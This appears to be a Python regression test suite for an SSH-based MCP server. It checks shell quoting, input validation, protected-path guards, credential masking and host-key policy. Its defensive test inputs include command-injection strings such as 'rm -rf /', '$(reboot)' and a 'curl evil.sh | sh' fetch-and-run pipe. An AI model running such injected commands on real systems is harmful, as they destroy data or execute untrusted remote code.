"""
Regression tests for Linux SSH MCP safety and correctness fixes.

Author: Pawan Gunjkar (pawangunjkar@gmail.com)

No real SSH server is needed: commands are captured from a fake runner and the
output reader is exercised against a fake paramiko channel.
"""

from __future__ import annotations

import os
import shlex
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

os.environ["SSH_MCP_CACHE_DIR"] = tempfile.mkdtemp()
for var in ("SSH_HOST", "SSH_PASSWORD", "SSH_HOST_KEY_POLICY", "SSH_KNOWN_HOSTS"):
    os.environ.pop(var, None)

import paramiko  # noqa: E402

from linux_ssh_mcp import server  # noqa: E402
from linux_ssh_mcp import ssh_manager  # noqa: E402
from linux_ssh_mcp.ssh_manager import CommandResult, SSHManager, SSHSession  # noqa: E402


class CommandCaptureTestCase(unittest.TestCase):
    """Replace the remote runner so each test sees the exact shell command."""

    def setUp(self):
        self.commands: list[str] = []
        self.stdin: list = []
        self.next_result = CommandResult(stdout="ok", exit_code=0)

        def fake_run(command, session_name="default", timeout=30, max_output=0, stdin_data=None):
            self.commands.append(command)
            self.stdin.append(stdin_data)
            return self.next_result

        patcher = mock.patch.object(server._ssh, "run", side_effect=fake_run)
        patcher.start()
        self.addCleanup(patcher.stop)

    @property
    def last(self) -> str:
        return self.commands[-1]

    def tokens(self) -> list[str]:
        return shlex.split(self.last)


class QuotingTests(CommandCaptureTestCase):
    def test_paths_cannot_inject_commands(self):
        evil = "/tmp/a; rm -rf / #"
        server.ssh_read_file(evil)
        self.assertEqual(self.tokens(), ["cat", evil])
        server.ssh_tail_file("$(reboot)", lines=5)
        self.assertEqual(self.tokens(), ["tail", "-n", "5", "$(reboot)"])
        server.ssh_move("a b", "`id`")
        self.assertEqual(self.tokens(), ["mv", "a b", "`id`"])

    def test_leading_dash_path_is_not_an_option(self):
        server.ssh_list_directory("-rf")
        self.assertEqual(self.tokens(), ["ls", "-la", "./-rf"])

    def test_grep_pattern_with_quote_is_safe(self):
        server.ssh_search_in_files("it's $HOME", path="/var/log")
        self.assertIn("-e", self.tokens())
        self.assertIn("it's $HOME", self.tokens())

    def test_docker_exec_runs_command_as_one_argument(self):
        server.ssh_docker_exec("web-1", "echo hi && cat /etc/hostname")
        self.assertEqual(self.tokens(), ["docker", "exec", "web-1", "sh", "-c", "echo hi && cat /etc/hostname"])
        out = server.ssh_docker_exec("web; reboot", "ls")
        self.assertIn("Invalid container name", out)

    def test_background_command_and_log_are_quoted(self):
        self.next_result = CommandResult(stdout="4242\n", exit_code=0)
        out = server.ssh_execute_background("sleep 10; echo done")
        self.assertIn("sh -c 'sleep 10; echo done'", self.last)
        self.assertIn("PID: 4242", out)
        self.assertNotIn("$(date", out)

    def test_script_goes_through_stdin(self):
        script = "echo 'quoted'\ncat <<EOF\n$HOME\nEOF\n"
        server.ssh_execute_script(script)
        self.assertEqual(self.last, "bash -s")
        self.assertEqual(self.stdin[-1], script)

    def test_sed_literal_mode_escapes_regex_characters(self):
        server.ssh_sed_replace("/etc/app.conf", "a.b/c[1]", "x&y/z")
        script = self.tokens()[2]
        self.assertEqual(script, r"s/a\.b\/c\[1\]/x\&y\/z/g")

    def test_package_names_are_validated(self):
        with mock.patch.object(server, "_detect_pkg_manager", return_value="apt"):
            out = server.ssh_install_package("nginx; curl evil.sh | sh")
        self.assertIn("Invalid package name", out)
        self.assertEqual(self.commands, [])
        with mock.patch.object(server, "_detect_pkg_manager", return_value="apt"):
            server.ssh_install_package("nginx curl")
        self.assertTrue(self.last.endswith("apt-get install -y nginx curl"))


class GuardTests(CommandCaptureTestCase):
    def test_protected_paths_are_refused(self):
        for path in ("/", "/etc", "/etc/", "/usr/../usr", ""):
            out = server.ssh_delete(path, recursive=True)
            self.assertIn("Refusing", out, path)
        self.assertEqual(self.commands, [])

    def test_invalid_inputs_are_rejected_before_running(self):
        self.assertIn("Invalid signal", server.ssh_kill_process(123, signal="KILL; reboot"))
        self.assertIn("Refusing", server.ssh_kill_process(1))
        self.assertIn("Invalid host", server.ssh_check_port("x/1;id", 80))
        self.assertIn("Invalid cron schedule", server.ssh_add_cron("* * *", "echo"))
        self.assertIn("must not be empty", server.ssh_remove_cron(""))
        self.assertIn("Invalid permission", server.ssh_file_permissions("/tmp/x", "777; id"))
        self.assertIn("Invalid size", server.ssh_find_files("/", size="+1M -exec rm {} ;"))
        self.assertEqual(self.commands, [])

    def test_failed_command_is_not_reported_as_success(self):
        self.next_result = CommandResult(stderr="Permission denied", exit_code=1)
        out = server.ssh_create_directory("/root/x")
        self.assertNotIn("✅", out)
        self.assertIn("Permission denied", out)
        out = server.ssh_sed_replace("/etc/x", "a", "b")
        self.assertNotIn("✅", out)

    def test_failed_logins_falls_back_by_file_presence(self):
        server.ssh_failed_logins(count=5)
        self.assertIn("elif [ -r /var/log/secure ]", self.last)
        self.assertIn("journalctl", self.last)

    def test_cron_remove_counts_matches(self):
        self.next_result = CommandResult(stdout="0\n", exit_code=1)
        out = server.ssh_remove_cron("backup.sh")
        self.assertIn("Nothing changed", out)
        self.assertEqual(len(self.commands), 1)


class WriteFileTests(unittest.TestCase):
    def test_write_uses_sftp(self):
        with mock.patch.object(server._ssh, "write_file", return_value=(True, "")) as write:
            out = server.ssh_write_file("/tmp/x.txt", "MCPEOF\n$HOME `id`\n")
        write.assert_called_once_with("/tmp/x.txt", "MCPEOF\n$HOME `id`\n", session_name="default", append=False)
        self.assertIn("✅ Written to /tmp/x.txt", out)


class CredentialDisplayTests(unittest.TestCase):
    def test_password_characters_never_shown(self):
        server._credential_store.save_credentials("box", "10.0.0.5", "ops", password="hunter2xy")
        try:
            out = server.ssh_list_saved_credentials()
        finally:
            server._credential_store.delete_credentials("box")
        self.assertNotIn("xy", out.replace("box", ""))
        self.assertIn("(saved, hidden)", out)


class FakeChannel:
    """Imitates a paramiko Channel: output arrives in chunks, exit status only after all output."""

    def __init__(self, stdout_chunks, stderr_chunks=(), exit_code=0, never_exits=False):
        self.stdout = list(stdout_chunks)
        self.stderr = list(stderr_chunks)
        self.exit_code = exit_code
        self.never_exits = never_exits
        self.closed = False
        self.sent = b""

    def exec_command(self, command):
        self.command = command

    def sendall(self, data):
        self.sent += data

    def shutdown_write(self):
        pass

    def recv_ready(self):
        return bool(self.stdout)

    def recv(self, n):
        return self.stdout.pop(0)

    def recv_stderr_ready(self):
        return bool(self.stderr)

    def recv_stderr(self, n):
        return self.stderr.pop(0)

    def exit_status_ready(self):
        # Like a real process: it cannot exit until its output has been read.
        return not self.never_exits and not self.stdout and not self.stderr

    def recv_exit_status(self):
        return self.exit_code

    def close(self):
        self.closed = True


class RunLoopTests(unittest.TestCase):
    def _manager_with_channel(self, channel):
        manager = SSHManager(credential_store=server._credential_store)
        transport = mock.MagicMock()
        transport.open_session.return_value = channel
        transport.is_active.return_value = True
        client = mock.MagicMock()
        client.get_transport.return_value = transport
        manager._sessions["default"] = SSHSession(name="default", host="h", port=22, username="u", client=client)
        return manager

    def test_large_output_is_drained_and_truncated(self):
        chunk = b"x" * 32768
        channel = FakeChannel([chunk] * 100, exit_code=0)  # ~3.2 MB, more than any SSH window
        manager = self._manager_with_channel(channel)
        result = manager.run("cat big", max_output=1000)
        self.assertTrue(result.ok)
        self.assertEqual(result.stdout_bytes, 32768 * 100)
        self.assertEqual(len(result.stdout), 1000)
        self.assertIn("OUTPUT TRUNCATED", result.format())
        self.assertTrue(channel.closed)

    def test_timeout_is_enforced(self):
        channel = FakeChannel([b"partial"], never_exits=True)
        manager = self._manager_with_channel(channel)
        with mock.patch.object(ssh_manager, "MAX_TIMEOUT", 300):
            result = manager.run("sleep 999", timeout=1)
        self.assertTrue(result.timed_out)
        self.assertFalse(result.ok)
        self.assertIn("timed out after 1s", result.format())
        self.assertIn("partial", result.format())
        self.assertTrue(channel.closed)

    def test_stdin_and_exit_code(self):
        channel = FakeChannel([b"out"], [b"warn"], exit_code=3)
        manager = self._manager_with_channel(channel)
        result = manager.run("bash -s", stdin_data="echo hi")
        self.assertEqual(channel.sent, b"echo hi")
        self.assertEqual(result.exit_code, 3)
        self.assertIn("[EXIT CODE: 3]", result.format())
        self.assertIn("[STDERR]\nwarn", result.format())


class HostKeyPolicyTests(unittest.TestCase):
    def tearDown(self):
        os.environ.pop("SSH_HOST_KEY_POLICY", None)

    def test_default_policy_verifies_and_persists(self):
        manager = SSHManager(credential_store=server._credential_store)
        client = manager._new_client()
        self.assertIsInstance(client._policy, paramiko.AutoAddPolicy)
        self.assertEqual(Path(client._host_keys_filename), manager.known_hosts_path)
        self.assertTrue(manager.known_hosts_path.exists())

    def test_strict_policy_rejects_unknown_hosts(self):
        os.environ["SSH_HOST_KEY_POLICY"] = "strict"
        client = SSHManager(credential_store=server._credential_store)._new_client()
        self.assertIsInstance(client._policy, paramiko.RejectPolicy)

    def test_unknown_policy_falls_back_to_accept_new(self):
        os.environ["SSH_HOST_KEY_POLICY"] = "whatever"
        self.assertEqual(SSHManager.host_key_policy(), "accept-new")

    def test_changed_host_key_is_reported(self):
        manager = SSHManager(credential_store=server._credential_store)
        key = paramiko.RSAKey.generate(1024)
        bad = paramiko.BadHostKeyException("h", key, key)
        with mock.patch.object(paramiko.SSHClient, "connect", side_effect=bad):
            out = manager.connect(host="h", password="p", save_credentials=False)
        self.assertIn("HOST KEY MISMATCH", out)


if __name__ == "__main__":
    unittest.main()
